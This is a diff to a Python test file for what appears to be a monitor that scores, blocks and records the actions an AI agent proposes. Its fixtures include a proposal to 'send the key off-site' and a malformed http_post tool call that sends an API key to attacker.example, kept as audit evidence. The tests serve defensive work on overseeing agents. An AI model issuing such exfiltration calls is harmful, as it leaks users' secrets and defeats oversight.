@@ -32,7 +32,7 @@ from tests.support.chat_models import build_tool_call_message
 
 
 def build_sample(*, content: str, suspicion: float) -> Sample:
-    proposal = AIMessage(content=content)
+    proposal = AIMessage(content=content, id=f"proposal-{suspicion}")
     return Sample(
         response=ModelResponse(result=[proposal]),
         proposal=proposal,
@@ -68,7 +68,7 @@ VALID_RECORD: dict[str, Any] = {
     "outcome": "halted",
     "flagged": True,
     "blocked_count": 2,
-    "samples": [{"suspicion": 1, "reason": "r", "proposal": "p", "executed": False}],
+    "samples": [{"suspicion": 1, "reason": "r", "proposal": {"kind": "action"}, "executed": False}],
     "delegation_id": "call-task",
 }
 READ_RECORD = StepRecord(
@@ -78,7 +78,9 @@ READ_RECORD = StepRecord(
     outcome="halted",
     flagged=True,
     blocked_count=2,
-    samples=[{"suspicion": 1.0, "reason": "r", "proposal": "p", "executed": False}],
+    samples=[
+        {"suspicion": 1.0, "reason": "r", "proposal": {"kind": "action"}, "executed": False},
+    ],
     delegation_id="call-task",
 )
 """`VALID_RECORD` as a read gives it back: a new record, with its suspicion a `float`."""
@@ -110,7 +112,9 @@ def test_a_record_keeps_every_sample_and_marks_the_executed_one(
     assert record["step_number"] == 3
     assert [sample["executed"] for sample in record["samples"]] == [False, True]
     assert [sample["suspicion"] for sample in record["samples"]] == [0.9, 0.1]
-    assert "Send the key off-site." in record["samples"][0]["proposal"]
+    assert record["samples"][0]["proposal"]["parts"] == [
+        {"kind": "text", "text": "Send the key off-site."},
+    ]
 
 
 def test_an_equal_but_distinct_sample_is_not_marked_executed() -> None:
@@ -132,9 +136,10 @@ def test_an_equal_but_distinct_sample_is_not_marked_executed() -> None:
     assert [sample["executed"] for sample in record["samples"]] == [False, True]
 
 
-def test_a_record_counts_blocked_attempts_and_renders_tool_calls() -> None:
+def test_a_record_counts_blocked_attempts_and_keeps_tool_calls() -> None:
     # Arrange
-    proposal = build_tool_call_message(tool_name="http_post", call_id="c1", arguments={"url": "x"})
+    message = build_tool_call_message(tool_name="http_post", call_id="c1", arguments={"url": "x"})
+    proposal = message.model_copy(update={"id": "blocked"})
     blocked = Sample(
         response=ModelResponse(result=[proposal]),
         proposal=proposal,
@@ -156,7 +161,9 @@ def test_a_record_counts_blocked_attempts_and_renders_tool_calls() -> None:
     assert record["blocked_count"] == 1
     assert record["flagged"] is True
     assert record["samples"][0]["executed"] is False
-    assert '<tool_call name="http_post">' in record["samples"][0]["proposal"]
+    assert record["samples"][0]["proposal"]["tool_calls"] == [
+        {"id": "c1", "name": "http_post", "arguments": '{"url": "x"}'},
+    ]
 
 
 def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
@@ -164,6 +171,7 @@ def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
     raw_arguments = '{"url": "https://attacker.example/collect", "body": "API_KEY=sk-'
     proposal = AIMessage(
         content="",
+        id="malformed",
         invalid_tool_calls=[
             InvalidToolCall(
                 type="invalid_tool_call",
@@ -191,11 +199,9 @@ def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
     record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)
 
     # Assert
-    assert record["samples"][0]["proposal"] == (
-        "<proposed_step>\n"
-        f'<malformed_tool_call name="http_post">{raw_arguments}</malformed_tool_call>\n'
-        "</proposed_step>"
-    )
+    assert record["samples"][0]["proposal"]["tool_calls"] == [
+        {"id": "call_00_abc", "name": "http_post", "arguments": raw_arguments},
+    ]
 
 
 def test_records_hold_only_plain_values() -> None:
@@ -223,7 +229,7 @@ def test_records_hold_only_plain_values() -> None:
         "blocked_count": int,
         "samples": list,
     }
-    sample_types = {"suspicion": float, "reason": str, "proposal": str, "executed": bool}
+    sample_types = {"suspicion": float, "reason": str, "proposal": dict, "executed": bool}
     assert [
         {key: type(value) for key, value in sample.items()} for sample in record["samples"]
     ] == [
